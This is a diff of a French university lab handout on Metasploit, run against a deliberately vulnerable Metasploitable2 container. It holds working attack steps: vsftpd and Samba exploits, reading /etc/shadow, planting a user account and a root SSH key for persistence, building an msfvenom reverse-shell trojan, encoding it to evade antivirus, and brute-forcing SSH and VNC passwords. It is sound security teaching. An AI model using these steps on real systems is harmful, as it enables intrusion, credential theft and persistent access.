@@ -2,19 +2,20 @@
 
 TODO avant de lancer le TP :
 
+Pour lancer une machine metasploitable2
+
 o Instancier une VM snap-docker-ready
 o docker pull tleemcjr/metasploitable2
 o docker run --name metasploitable2 -it \
-
--p 21:21 -p 6200:6200 -p 80:80 -p 2222:22 -p 5900:5900 -p 139:139
-
+-p 21:21 -p 6200:6200 -p 80:80 -p 2222:22 -p 5900:5900 -p 139:139 -p 445:445 \
 tleemcjr/metasploitable2:latest sh -c "/bin/services.sh && bash"
 
---
-o ouvrir les ports :
+Usage of /:   43.8% of 9.52GB 
+o ouvrir les ports (Security groups):
 	21,6200
-	139
+	139,445
 	80,4444
+	2222
 	
 
 
@@ -26,6 +27,7 @@ o ouvrir les ports :
 # TP Metasploit
 
 > Responsables : Jp Gelas, Thomas Begin
+> Version : 0.1a (10/2020)
 
 - - - 
 
@@ -55,27 +57,44 @@ _______________________________________________________________   ,&$$$$$$'_____
                                                            ` ......;;;;... .  .
 ```
 
-
+<!-- -->
 
 Metasploit est un framework qui aide à trouver et à exploiter des vulnérabilités.
 
-Le framework Metasploit est l'un des outils de test les plus utiles dont disposent les professionnels de la sécurité (les pentesteurs). Grâce à Metasploit, vous pouvez accéder aux exploits divulgués pour une grande variété d'applications et de systèmes d'exploitation. Vous pouvez automatiquement analyser, tester et exploiter des systèmes en utilisant du code que d'autres pentesteurs, hackers ou pirates ont écrit.
+Le framework Metasploit est l'un des outils de test les plus utiles dont
+disposent les professionnels de la sécurité (les pentesteurs). Grâce à
+Metasploit, vous pouvez accéder aux exploits divulgués pour une grande variété
+d'applications et de systèmes d'exploitation. Vous pouvez automatiquement
+analyser, tester et exploiter des systèmes en utilisant du code que d'autres
+pentesteurs, hackers ou pirates ont écrit.
 
 Metasploit fournit également une plateforme de développement qui vous permet d'écrire vos propres outils de sécurité ou d'exploiter du code. Nous n'aborderons pas cette partie dans ce TP.
 
-Ce TP est une introduction aux bases de l'utilisation de Metasploit. A savoir, comment  utiliser le framework et exploiter une vulnérabilité.
+> Ce TP est une introduction aux bases de l'utilisation de Metasploit. A savoir,
+> comment  utiliser le framework et exploiter une vulnérabilité.
 
 ### Démarrage de Metasploit
 
-Instancier une VM avec l'image `Kali Linux 2020.3` (créez un nouveau volume de 30GB a supprimer lors de la destruction de la VM), 
-selectionner un *flavor* `m1.small` et votre clé SSH si vous en aviez plusieurs. 
-Cette image contient le framework Metasploit pré installé. Notez que la distribution *Kali Linux* vient avec Metasploit pré installé.
+Instancier une VM avec l'image `Kali Linux 2020.3` sur `cloud-info.univ-lyon1.fr`.
+Créez un nouveau volume de 30GB a supprimer lors de la destruction de la VM.
+Selectionner un *flavor* `m1.small`, votre clé SSH si vous en aviez plusieurs et le cas échéant un *vlan*. 
+L'image *kali* contient le framework Metasploit pré installé. 
+Notez que la distribution *Kali Linux* vient avec Metasploit pré installé.
 
-Pour vous connecter à la VM vous saisirez la commande suivante : `ssh -i ~/maclé kali@adresseIPdeMaVM` (noté le login: **kali**).
-Pour devenir root le mot de passe est **toor** (exemple: `su -` ou `sudo su -` pour ne pas avoir à taper de mot de passe).
+Pour vous connecter à la VM avec le login `kali` vous saisirez la commande suivante : `ssh -i ~/maclé kali@adresseIPdeMaVM`.
+Notez que pour devenir root sur cette distribution le mot de passe est **toor** (exemple: `su -` ou `sudo su -` pour ne pas avoir à taper de mot de passe).
 
 Pour lancer le framework il suffit de saisir la commande `msfconsole` dans un terminal (Attention c'est lent la premiére fois). 
 L'invite devient `msf5>`. 
+
+Combien d'exploits sont mis à votre disposition ?
+
+<!-- plus de 2000 -->
+
+```text
+  
+```
+
 La première commande que vous pouvez saisir est la commande `help` qui permet d'afficher le menu d'aide (et `banner` pour le fun).
 
 
@@ -85,14 +104,16 @@ msf> help
 ...
 ```
 
-Vous pouvez ensuite saisir la commande `search` pour obtenir la liste du ou des modules en lien avec le mot clé que vous passerez en paramètre. 
-Par exemple la commande suivante listera tous les scripts et exploits en lien avec MySql.
+Vous pouvez ensuite saisir la commande `search` pour obtenir la liste du ou des
+modules en lien avec le mot clé que vous passerez en paramètre.  Par exemple la
+commande suivante listera tous les scripts et exploits en lien avec MySql.
 
 ```
 msf> search mysql
 ```
 
-**Astuce :** La commande `help search` permet d'obtenir la liste des filtres qui peuvent être utilisé avec la commande `search`.
+**Astuce :** La commande `help search` permet d'obtenir la liste des filtres
+qui peuvent être utilisé avec la commande `search`.
 
 La commande `info` affiche des informations supplémentaires.
 
@@ -100,7 +121,9 @@ La commande `info` affiche des informations supplémentaires.
 msf> info exploit/linux/http/librenms_collectd_cmd_inject
 ```
 
-Une fois que vous avez décidé quel module utiliser, saisissez la commande `use` pour le selectionner. Cela modifiera le contexte de vos commandes et vous permettra d'exécuter des commandes spécifiques à ce module.
+Une fois que vous avez décidé quel module utiliser, saisissez la commande `use`
+pour le selectionner. Cela modifiera le contexte de vos commandes et vous
+permettra d'exécuter des commandes spécifiques à ce module.
 
 ```text
 msf> use exploit/linux/http/librenms_collectd_cmd_inject
@@ -109,7 +132,8 @@ msf exploit(linux/http/librenms_collectd_cmd_inject) >
 
 ### Exploiter des vulnerabilités avec Metasploit
 
-Maintenant que vous êtes à l'intérieur d'un module, saisissez la commande `options` pour voir ce que vous pouvez configurer avec la commande `set`.
+Maintenant que vous êtes à l'intérieur d'un module, saisissez la commande
+`options` pour voir ce que vous pouvez configurer avec la commande `set`.
 
 
 ```text
@@ -117,16 +141,20 @@ msf exploit(linux/http/librenms_collectd_cmd_inject) > options
 ...
 msf exploit(linux/http/librenms_collectd_cmd_inject) > set RHOSTS 192.168.1.254
 ```
-Vous devrez définir toutes les variables requises (*Required: yes*) avant de pouvoir exécuter l'exploit.
-Une fois vos *settings* terminé vous pouvez saisir à nouveau la commande `options` pour vérifier la bonne prise en compte de vos paramètres.
+Vous devrez définir toutes les variables requises (*Required: yes*) avant de
+pouvoir exécuter l'exploit.  Une fois vos *settings* terminé vous pouvez saisir
+à nouveau la commande `options` pour vérifier la bonne prise en compte de vos
+paramètres.
 
-Dans Metasploit, `LHOST`, `RHOST` et `SRVHOST` sont parmi les noms de variables les plus couramment utilisés. 
+Dans Metasploit, `LHOST`, `RHOST` ou ``RHOSTS` et `SRVHOST` sont parmi les noms
+de variables les plus couramment utilisés. 
 
   - `LHOST` fait référence à l'adresse IP de votre machine, qui est généralement utilisée pour créer une connexion inverse à votre machine une fois l'attaque réussie. 
-  - `RHOST` fait référence à l'adresse IP de l'hôte cible. 
+  - `RHOST` fait référence à l'adresse IP de l'hôte cible (ou des hôtes cibles pour `RHOSTS`). 
   - `SRVHOST` est l'adresse à laquelle le module se connectera pour télécharger des *payloads* supplémentaires (non utilisé dans ce TP).
 
-Enfin, une fois la configuration terminée, vous pouvez lancer la commande `exploit` pour lancer l'exploit !
+Enfin, une fois la configuration terminée, vous pouvez lancer la commande
+`exploit` ou `run` pour lancer l'exploit !
 
 ```
 msf exploit(linux/http/librenms_collectd_cmd_inject) > exploit
@@ -166,17 +194,9 @@ https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasplo
   
 ```
 
-Lancez le framework Metasploit si ce n'est déjà fait.
-    
-Combien d'exploits sont mis à votre disposition ?
-
-<!-- plus de 2000 -->
-
-```text
-  
-```
-
-Quelle commande de recherche allez vous saisir dans la console de Metasploit pour savoir si un (ou plusieurs) exploits sont disponibles pour exploiter ce service ftp en particulier.
+Quelle commande de recherche allez vous saisir dans la console de Metasploit
+pour savoir si un (ou plusieurs) exploits sont disponibles pour exploiter ce
+service ftp en particulier.
 
 <!-- search vsftpd -->
 
@@ -200,7 +220,8 @@ Comment obtenir plus d'information sur cet exploit dans la console msf ?
   
 ```
 
-Notez dans la section _Basic options_ quelles sont les variables que vous devrez configurer ?
+Notez dans la section _Basic options_ quelles sont les variables que vous
+devrez configurer ?
 
 <!--  RHOST -->
 
@@ -208,16 +229,8 @@ Notez dans la section _Basic options_ quelles sont les variables que vous devrez
   
 ```
 
-Sélectionnez l'exploit avec la commande `use`.
-
+Sélectionnez l'exploit avec la commande `use`. L'invite de la ligne de commande a t-il changé ?
 <!-- use exploit/unix/ftp/vsftpd_234_backdoor -->
-
-```text
-  
-```
-
-Quel est le nouvel invite de la ligne de commande ?
-
 <!-- msf exploit(vsftpd_234_backdoor)>_ -->
 
 ```text
@@ -233,13 +246,14 @@ Initialisez `RHOSTS` avec `set` puis lancez l'exploit.
 ```
 
 Un lien de communication devrait être établi entre la machine attaquante (msf) et 
-la machine  cible (vsftpd). Remarquez que les ports utilisés sont différents de 21 
+la machine  cible (vsftpd). Remarquez que le port utilisé est différent de 21 
 (port ftp standard).
 
 Bien que l'invite soit nul, vous pouvez saisir des commandes (ex: `ls`, `pwd`, ...)
 
 
-**Astuce** : Pour avoir un invite plus sympthique, la commande suivante *spawn* un pseudo-terminal `python -c 'import pty; pty.spawn("/bin/sh")'`. 
+**Astuce** : Pour avoir un invite plus sympthique, la commande suivante *spawn*
+un pseudo-terminal `python -c 'import pty; pty.spawn("/bin/bash")'`. 
 
 Quelles commandes saisir pour connaitre votre rôle (ou niveau de privilège) sur la cible ?
 
@@ -249,7 +263,8 @@ Quelles commandes saisir pour connaitre votre rôle (ou niveau de privilège) su
   
 ```
 
-Récupérez la version hashé des mots de passe. Vous pourrez l'utiliser plus tard avec un dictionnaire et un outil comme john (the ripper). 
+Récupérez la version hashée des mots de passe. Vous pourrez l'utiliser plus
+tard avec un dictionnaire et un outil comme john (the ripper). 
 
 <!--  cat /etc/shadow -->
 
@@ -257,7 +272,8 @@ Récupérez la version hashé des mots de passe. Vous pourrez l'utiliser plus ta
   
 ```
 
-Profitez-en également pour vous assurez un retour facile sur cette machine compromise en vous créant un compte (pas très discret) 
+Profitez-en également pour vous assurez un retour facile sur cette machine
+compromise en vous créant un compte (pas très discret) 
 
 <!-- adduser hacker OU useradd -m -d /home/hacker -c "" -s /bin/bash hacker 
   -m = create home 
@@ -268,6 +284,8 @@ Profitez-en également pour vous assurez un retour facile sur cette machine comp
 
 ```
 
+Déconnectez vous de la machine cible.
+
 **Lien :** Plus d'informations sur cet exploit ([lien](https://subscription.packtpub.com/book/networking_and_servers/9781786463166/1/ch01lvl1sec18/vulnerability-analysis-of-vsftpd-2-3-4-backdoor)) et aller au-delà...
 
 
@@ -275,13 +293,16 @@ Profitez-en également pour vous assurez un retour facile sur cette machine comp
 
 ### Exploit 2 : Exploitation d'un service Samba
 
-Le résultat du scan précédent laisse apparaitre l'exposition d'un service Samba (sur les ports 139 et 445) qui est la version libre du système de partage de fichier de Windows. 
+Le résultat du scan précédent laisse apparaitre l'exposition d'un service Samba
+(sur les ports 139 et 445) qui est la version libre du système de partage de
+fichier de Windows. 
 
-Réalisez un scan qui vous permettra d'obtenir la version de Samba (module `smb_version` des outils auxiliaire de Metasploit)
+Réalisez un scan qui vous permettra d'obtenir la version de Samba (module
+`smb_version` des outils auxiliaire de Metasploit)
 
 ```text
 use ...
-show options
+options
 set ...
 run
 ```
@@ -295,15 +316,19 @@ _____ . _____ . _____
 ```
 
 
-
-Recherchez avec l'outil `searchsploit` (disponible sur Kali) si il existe un exploit relatif à cette version de Samba.
+Hors de la console msf (dans un autre terminal), utilisons l'outil
+`searchsploit` (disponible sur Kali).  Cet outil permet d'effectuer des
+recherches dans la base de données [exploit-db](https://exploit-db.com) (qui
+référence divers exploits et techniques d'attaques) en ligne de commande.
+Existe t'il un exploit relatif à cette version de Samba ?
 
 ```text
 searchsploit samba | grep _____ . _____ . _____
 
 ```
 
-A présent, dans la console recherchez un exploit qui correspondrait aux mots clé retourné par *searchsploit*.
+A présent, dans la console *msf* recherchez un exploit qui correspondrait aux
+mots clé retourné par *searchsploit*.
 
 <!-- grep samba search username map script-->
 
@@ -320,14 +345,21 @@ Une fois trouvé, utilisez l'exploit
 
 ```text
 use ...
-show options
+options
 set ...
 run
  
 ```
 
 
-Cela devrait avoir pour effet de lancer un shell (minimaliste). Faite alors Ctrl-Z ou saisissez la commande `background`. Cela aura pour effet de vous proposer de mettre la session en background. Vous pouvez listez toutes les sessions en background avec la commande `sessions` et vous reconnectez à une session avec la commande `sessions suivi du numéro de session. Essayez.
+Cela devrait avoir pour effet de lancer un shell (minimaliste). 
+Tapez des commandes comme *ls* ou *id* pour vérifier.
+
+Faite alors `Ctrl-Z` ou saisissez la commande `background`. Cela aura pour effet
+de vous proposer de mettre la session en *background*. Vous pouvez listez
+toutes les sessions en background avec la commande `sessions` et vous
+reconnectez à une session avec la commande `sessions` suivi du numéro de
+session. Essayez.
 
 ```text
 background
@@ -336,9 +368,12 @@ sessions -l
 sessions -i 1
 ```
 
-Enfin profitez-en pour vous assurez un retour facile sur cette machine
-compromise en vous créant par exemple un accès plus discret en ajoutant votre clé publique
-ssh au fichier *authorized_keys* du compte root.
+Enfin profitez-en pour vous assurer un retour facile sur cette machine
+compromise en vous créant par exemple un accès plus discret en ajoutant votre
+clé publique ssh au fichier *authorized_keys* du compte root.
+
+**Astuce :** Utilisez la commande `echo` avec une redirection `>>`.
+
 
 <!-- 
  ssh_keygen (sur la Kali)
@@ -362,14 +397,18 @@ ssh au fichier *authorized_keys* du compte root.
 
 ### Exploit 3 : Service Web vulnerable (php + meterpreter)
 
-<!-- Verifier le bon demarrage de Apache2 -- service apache2 start -->
+<!-- Verifier le bon demarrage de Apache2 :  service apache2 start -->
+
+<!-- -->
 
 Essayont d'abord de déterminer quelle version de PHP est utilisé sur la machine cible.
-L'outil `dirbuster` ou `dirb` permet de découvrir la présence d'un fichier `phpinfo.php`. 
+L'outil `dirb` permet de vérifier la présence d'un fichier `phpinfo.php`. 
 
-<!--dirb http://192.168.239.xxx -->
+```
+dirb http://adresseMachineCible
+```
 
-Appelez le ensuite avec votre navigateur. Quelle version est utilisé ?
+Appelez ensuite ce fichier avec votre navigateur. Quelle version est utilisée ?
 <!-- 5.2.4 -->
 ```text
     ___ . ___ . ___
@@ -402,24 +441,38 @@ meterpreter > shell
 
 ```
 
-**Astuce :** Utilisez le payload `php/meterpreter/reverse_php`. 
+**Note :** La commande `show payloads` affiche la liste des payloads pour cet exploit. 
+Utilisez le payload par défaut `php/meterpreter/reverse_tcp`. 
 
 Une fois l'exploit lancé (avec la commande `run` ou `exploit`) 
-vous devriez vous retrouver
-dans un shell *meterpreter*. Tapez les commandes `help`, `sysinfo`, `getuid`, 
+vous devriez vous retrouver dans un shell *meterpreter*.  
+
+> *Meterpreter* est un outil qui simplifie la phase de post-exploitation. C'est
+> plus exactement une charge utile (un *payload*) particulièrement avancée
+> permettant de simplifier la phase de post-exploitation grâce à la mise à
+> disposition d’un shell interactif.  Ce payload, entièrement exécuté en
+> mémoire, intègre de nombreuses fonctionnalités, par exemple télécharger des fichiers,
+> lancer un *keylogger*, prendre des captures d’écran, etc.... Meterpreter est
+> principalement disponible pour les cibles Windows.  Néanmoins, il existe
+> aussi des payloads permettant d’obtenir une session Meterpreter sous Linux et MacOS.
+
+
+Tapez les commandes `help`, `sysinfo`, `getuid`, 
 `shell`,...
  
 
 
-
+<!--
 Notez que deux *payload* sont fondamentaux.
 
   - `...bind_tcp` : connection direct de la machine attaquante vers la machine cible.
   - `...reverse_tcp` : la machine cible exécute le payload et se connecte à la machine attaquante.
+-->
+
 
 #### Defacing 
 Modifiez la page web d'accueil (index.php) en y inscrivant un message de propagande 
-amusant (Ex: Vive les pingoins !).
+amusant (Ex: Vive les pingouins !).
 
 <!-- sed -i -e 's/Warning/Hacked/g index.php -->
 
@@ -440,9 +493,10 @@ msfvenom -h
 
 msfvenom propose un grand nombre de **payload** (`msfvenom --list payload`).
 
-**Astuce** : Pour connaitre les options requise a un payload, vous pouvez utiliser la *msfconsole*.
+**Astuce** : Pour connaitre les options requise à un payload, vous pouvez utiliser la *msfconsole*.
 
 Créez et spécifiez un payload (`-p linux/x86/meterpreter/reverse_tcp`) et son format (`-f elf`). Remarquez sa taille.
+La commande ci-dessous devrait génèrer un binaire au format *elf* nommé *runmeplz*.
 
 <!-- msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=@IPattaquant LPORT=4444 -f elf > runmeplz -->
 
@@ -450,7 +504,7 @@ Créez et spécifiez un payload (`-p linux/x86/meterpreter/reverse_tcp`) et son 
 msfvenom -p ....................... -f ... LHOST=____.____.____.____ LPORT=.... > runmeplz
 ```
 
-A présent, dans la *msfconsole* nous allons lancer le module d'écoute en le paramétrant avec les mêmes
+À présent, dans la *msfconsole* nous allons lancer le module d'écoute en le paramétrant avec les mêmes
  paramétres que ceux utilisés pour générer notre payload ci-avant.
 
 ```text
@@ -461,14 +515,19 @@ set LHOST ____.____.____.____ #IP attaquant (kali)
 show info
 exploit -j -z
 ```
+
+Vérifiez que votre machine écoute sur le port 4444 avec la commande `ss -ant`.
 Nous voilà prêt à recevoir une connexion en provenance de la victime.
 
-Déployez/Copiez et lancez le payload `runmeplz` sur la machine cible (par le moyen de votre choix). 
-En vérité vous pousseriez la victime à lancer l'exécution de ce binaire sur son poste de travail.
+Déployez/Copiez et lancez le payload `runmeplz` sur la machine cible (par le
+moyen de votre choix).  
+
+> En pratique *runmeplz* pourrait être envoyé par email en pièce jointe à la victime. 
+> Puis vous inciteriez la victime à exécuter ce binaire sur son poste de travail.
 
 <!-- scp -P 2222 runmeplz msfadmin@192.168.239.113: -->
 
-Connectez vous à la nouvelle session qui apparait dés que la victime a lancez votre cheval de Troie (Trojan).
+Connectez vous à la nouvelle session qui apparait dés que la victime a lancé votre cheval de Troie (Trojan).
 Une fois la console `meterpreter` démarrée vous pouvez commencer une nouvelle phase de post-exploitation.
 
 ```text
@@ -477,37 +536,45 @@ meterpreter> sysinfo
 ...
 ```
 
-#### A propos d'encodage (optionnel)
+#### A propos d'encodage
 
-L'objectif de ce type d'un encodeur est de modifier le code du payload sans pour autant en modifier son fonctionnement.
+Pour rendre le code d'un binaire (ou d'un script) malveillant moins facile à
+détecter par un antivirus on utilise un encodeur.  L'objectif d'un encodeur est
+de modifier le code du payload sans pour autant en modifier son fonctionnement.
 
-Vous pouvez vérifier l'efficacité de votre encodage sur [virustotal.com](http://virustotal.com) par exemple.
+Vous pouvez vérifier l'efficacité d'un encodage appliqué à votre binaire sur
+[virustotal.com](http://virustotal.com) par exemple.
 
-Sans encodage (payload brute), combien d'antivirus détecte que votre payload est un *Trojan* ?
+Sans encodage (payload brut), combien d'antivirus détecte que votre payload est un *Trojan* ?
 
-A présent appliquez un (ou plusieurs) encodage.  
+A présent appliquez un (ou plusieurs) encodage lors de la génération de votre fichier *runmeplz*.  
 
 ```text
 msfvenom --list encoders 
 ```
 
-Nous vous recommandons a minima l'encodeur *shikata ga nai*. Vérifié l'efficacité de votre encodage. Que constatez-vous ?
+Nous vous recommandons a minima l'encodeur *shikata ga nai* (option `-e` de *msfvenom*). Vérifiez
+l'efficacité de votre encodage sur *virustotal.com*. Que constatez-vous ?
 
 ---
 
 ### Exploit 5 : Scanner (smb_enumusers) et bruteforce
+
+Nous allons utiliser un module de metasploit permettant de récupérer
+des informations (*data gathering*) sur le serveur Samba qui semble être disponible 
+sur la machine cible (port 139). 
 
 ```text
 use auxiliary/scanner/smb/smb_enumusers
 set RHOSTS ___.___.___.___
 run
 ```
-Vous devriez obtenir une liste de nom d'utilisateurs (msfadmin, klog, sys, user, service,...).
+Vous devriez obtenir une liste de nom d'utilisateurs (*msfadmin, klog, sys, user, service,...*).
 
-En vous appuyant sur le dictionnaire *rockyou.txt* (disponible sur Kali dans
-/usr/share/wordlists/) par exemple et un outil comme *hydra* (ou *patator*, ou
-*ncrack*) tentez de déterminer le mot de passe du compte **klog** sur le service
-ssh (exceptionnellement sur le port 2222).
+En vous appuyant par exemple sur le dictionnaire *rockyou.txt* (disponible sur Kali dans
+`/usr/share/wordlists/`) et un outil comme *hydra* ou
+*ncrack* tentez de déterminer le mot de passe du compte **klog** sur le service
+*ssh* (**ATTENTION !** Exceptionnellement ssh est sur le port **2222**).
 
 <!-- 
 hydra -l klog -P /usr/share/wordlists/rockyou.txt 192.168.239.113 -s 2222 ssh #(OK)
@@ -520,9 +587,13 @@ ncrack 192.168.239.113 -p ssh:2222 --user klog -P /usr/share/wordlists/rockyou.t
 
 ---
 
+<!-- -->
+
 ### Exploit 6 : VNC (port 5900)
 
-Un dernier exploit pour la route. Découvrez quel mot de passe est associé au compte *root* du survice VNC qui tourne sur la machine cible. Vous utiliserez pour cela le module `vnc_login`.
+Un dernier exploit pour la route. Découvrez quel mot de passe est associé au
+compte *root* du service VNC qui tourne sur la machine cible. Vous utiliserez
+pour cela le module `vnc_login`.
 
 
 ```text
@@ -537,7 +608,7 @@ Quel mot de passe est associé à ce username (root) ?
 ```text
 Login successful : ___________
 ```
-Validez ces *credentials* dans un terminal avec la commande vncviewer
+Validez ces *credentials* dans un terminal avec la commande `vncviewer`.
 
 ```text
 vncviewer @IPcible
@@ -550,17 +621,18 @@ Mot de passe : ___________
 
 # Conclusion
 
-Dans ce TP nous n'avons vu que quelques fonctionnalités du framework Metasploit.
+Dans ce TP nous avons vu quelques fonctionnalités du framework Metasploit.
 C'est un outil puissant néanmoins tous les exploits peuvent être réalisé sans
 l'usage de Metasploit. Cela demande alors généralement un peu plus
 d'investissement de la part du pentesteur.
 Nous avons également vu (trop) rapidement l'interpreteur *Meterpreter*. C'est
 un outil qui peut s'averer redoutable notamment quand la cible est un poste
 Windows (prise de contrôle de la caméra, du micro et keylogging).  
-Enfin certaines attaques vu dans ce TP sont bien trop *bruyantes* pour être
-réaliste dans un réseau administré correctement néamoins nous avons  aussi vu
-des outils qui ne laisse pas ou peu de trace sur la machine victime.
-Enfin le dernier point non abordé dans ce TP est la notion de *pivoting* qui
+
+Enfin certaines attaques vues dans ce TP sont bien trop *bruyantes* pour être
+réalistes dans un réseau administré correctement. Néanmoins nous avons  aussi vu
+des outils qui ne laissent pas ou peu de trace sur la machine victime.
+Enfin un autre point non abordé dans ce TP est la notion de *pivoting* qui
 consiste a utiliser une première machine compromise pour attaquer d'autres
 machines initialement inaccessible.
 
